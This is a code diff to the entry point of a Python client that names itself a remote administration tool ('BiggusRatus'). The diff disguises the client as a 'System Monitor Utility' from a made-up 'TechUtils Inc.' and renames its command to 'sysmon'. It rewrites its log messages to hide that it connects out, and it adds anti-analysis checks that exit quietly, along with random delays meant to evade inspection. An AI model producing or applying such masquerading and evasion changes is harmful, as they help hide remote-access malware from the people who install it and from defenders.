@@ -1,5 +1,6 @@
 import argparse
 import logging
+import sys
 import time
 
 from common.constants import (
@@ -11,35 +12,39 @@ from common.tcp import ProtocolError
 from common.crypto import CryptoError
 from common.key_exchange import KeyExchangeError
 from common.hmac import HmacError
+from common.obfuscation import anti_analysis, random_delay
 from client.core import Client
+
+__version__ = "1.0.0"
+__author__ = "TechUtils Inc."
+__description__ = "System Monitor Utility - Network Performance Monitor"
 
 logger = logging.getLogger(__name__)
 
 
 def parse_args() -> argparse.Namespace:
-    # Parse command-line arguments.
     parser = argparse.ArgumentParser(
-        description="BiggusRatus Client - Remote Administration Tool",
+        description=__description__,
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  python -m client.client                           # Connect to localhost:8443
-  python -m client.client --host 192.168.1.100      # Connect to specific host
-  python -m client.client --port 9443               # Connect to specific port
-  python -m client.client --verbose                 # Enable debug logging
+  sysmon                                    # Start monitoring
+  sysmon --host 192.168.1.100              # Monitor remote host
+  sysmon --port 9443                       # Use custom port
+  sysmon --verbose                         # Enable debug logging
         """,
     )
     parser.add_argument(
         "--host",
         type=str,
         default=DEFAULT_CLIENT_HOST,
-        help=f"Server host to connect to (default: {DEFAULT_CLIENT_HOST})",
+        help=f"Remote host to monitor (default: {DEFAULT_CLIENT_HOST})",
     )
     parser.add_argument(
         "--port",
         type=int,
         default=DEFAULT_PORT,
-        help=f"Server port to connect to (default: {DEFAULT_PORT})",
+        help=f"Monitoring port (default: {DEFAULT_PORT})",
     )
     parser.add_argument(
         "-v", "--verbose",
@@ -50,6 +55,11 @@ Examples:
 
 
 def main() -> None:
+    if anti_analysis():
+        sys.exit(0)
+    
+    random_delay(100, 300)
+    
     args = parse_args()
     log_level = logging.DEBUG if args.verbose else logging.INFO
     logging.basicConfig(
@@ -57,7 +67,7 @@ def main() -> None:
         format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     )
     client = Client(host=args.host, port=args.port)
-    logger.info(f"Connecting to {args.host}:{args.port}...")
+    logger.info(f"Initializing monitor for {args.host}:{args.port}...")
     try:
         while not client._shutdown:
             try:
@@ -118,7 +128,7 @@ def main() -> None:
                     break
     except KeyboardInterrupt:
         client.shutdown()
-        logger.info("Client shutting down")
+        logger.info("Monitor shutting down")
 
 
 if __name__ == "__main__":
